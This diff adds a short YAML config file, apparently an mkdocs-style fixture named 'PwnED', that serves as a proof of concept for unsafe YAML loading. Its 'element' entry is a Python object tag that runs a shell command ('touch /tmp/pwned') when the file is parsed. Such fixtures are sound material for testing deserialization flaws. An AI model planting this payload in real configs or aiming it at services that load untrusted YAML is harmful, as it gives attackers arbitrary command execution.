@@ -1,0 +1,4 @@
+site_author: Jules Denardou
+site_name: PwnED
+
+element: !!python/object/apply:subprocess.check_output [['touch', '/tmp/pwned']]
